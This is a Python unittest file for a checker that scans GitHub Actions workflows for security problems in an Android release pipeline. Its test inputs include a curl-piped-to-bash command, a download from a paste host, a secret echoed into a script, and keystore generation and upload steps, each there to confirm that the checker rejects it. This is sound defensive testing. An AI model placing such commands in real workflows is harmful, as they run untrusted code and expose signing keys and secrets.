#!/usr/bin/env python3
"""Self-tests for tools/check_workflows.py (SEC-3). Stdlib unittest."""
import contextlib
import io
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import check_workflows as cw  # noqa: E402

GOOD = """name: ok
on: [push]
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: sign
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
        run: |
          gh release create "$TAG" \\
            "$SIGNED_APK" \\
            --title x
      - uses: actions/upload-artifact@v4
        with:
          name: apks
          path: |
            app/build/outputs/apk/debug/app-debug.apk
"""


def run(files):
    with tempfile.TemporaryDirectory() as d:
        wf = os.path.join(d, ".github", "workflows")
        os.makedirs(wf)
        for name, text in files.items():
            with open(os.path.join(wf, name), "w", encoding="utf-8") as fh:
                fh.write(text)
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = cw.main(["--root", d])
        return code, out.getvalue()


class T(unittest.TestCase):
    def fails(self, text, needle, name="w.yml"):
        code, out = run({name: text})
        self.assertEqual(code, 1, out)
        self.assertIn(needle, out)

    def test_good_passes(self):
        code, out = run({"w.yml": GOOD})
        self.assertEqual(code, 0, out)

    def test_removed_files_fail(self):
        self.fails(GOOD, "must not exist", "apply-phase2.yml")
        self.fails(GOOD, "must not exist", "generate-keystore.yml")

    def test_paste_host(self):
        self.fails(GOOD + "      - run: curl https://paste.rs/abc > p.patch\n", "paste")

    def test_pipe_to_shell(self):
        self.fails(GOOD + "      - run: curl -fsSL https://x.test/i.sh | bash\n", "pipes")

    def test_keytool_genkey(self):
        self.fails(GOOD + "      - run: keytool -genkey -v -keystore k.jks\n", "generates a keystore")

    def test_comment_is_ignored(self):
        code, out = run({"w.yml": GOOD + "# keytool -genkey was removed; paste.rs too\n"})
        self.assertEqual(code, 0, out)

    def test_keystore_artifact(self):
        bad = GOOD + "      - uses: actions/upload-artifact@v4\n        with:\n          name: k\n          path: release-key.jks\n"
        self.fails(bad, "uploads a keystore")

    def test_missing_permissions(self):
        self.fails(GOOD.replace("permissions:\n  contents: read\n", "", 1), "no top-level")

    def test_write_all(self):
        self.fails(GOOD.replace("permissions:\n  contents: read\n", "permissions: write-all\n", 1), "write-all")

    def test_top_level_write(self):
        self.fails(GOOD.replace("  contents: read\njobs", "  contents: write\njobs", 1), "top-level permission")

    def test_secret_in_script(self):
        bad = GOOD + '      - run: echo "${{ secrets.TOKEN }}" | base64 -d\n'
        self.fails(bad, "secret interpolated")

    def test_debug_apk_in_release(self):
        bad = GOOD.replace('"$SIGNED_APK" \\', '"$DEBUG_APK" "$SIGNED_APK" \\')
        self.fails(bad, "debug APK")

    def test_wrong_root(self):
        with tempfile.TemporaryDirectory() as d:
            with contextlib.redirect_stderr(io.StringIO()):
                self.assertEqual(cw.main(["--root", d]), 2)


if __name__ == "__main__":
    unittest.main()
